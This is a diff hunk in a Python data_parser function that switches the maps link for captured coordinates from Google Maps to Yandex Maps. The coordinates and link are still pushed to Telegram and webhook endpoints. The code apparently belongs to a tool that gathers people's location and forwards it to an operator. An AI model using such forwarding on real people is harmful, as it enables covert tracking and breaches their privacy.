@@ -435,13 +435,13 @@ def data_parser():
                 utils.print(loc_info)
                 send_telegram(result_json, 'location')
                 send_webhook(result_json, 'location')
-                gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
-                gmaps_json = {
-                    'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+                yandex_maps_url = f'{G}[+] {C}Yandex Maps : {W}https://yandex.ru/maps/?ll={var_lon.strip(" deg")},{var_lat.strip(" deg")}&z=17&l=map&pt={var_lon.strip(" deg")},{var_lat.strip(" deg")},pm2rdm'
+                yandex_maps_json = {
+                    'url': f'https://yandex.ru/maps/?ll={var_lon.strip(" deg")},{var_lat.strip(" deg")}&z=17&l=map&pt={var_lon.strip(" deg")},{var_lat.strip(" deg")},pm2rdm'
                 }
-                utils.print(gmaps_url)
-                send_telegram(gmaps_json, 'url')
-                send_webhook(gmaps_json, 'url')
+                utils.print(yandex_maps_url)
+                send_telegram(yandex_maps_json, 'url')
+                send_webhook(yandex_maps_json, 'url')
 
                 if kml_fname is not None:
                     kmlout(var_lat, var_lon)
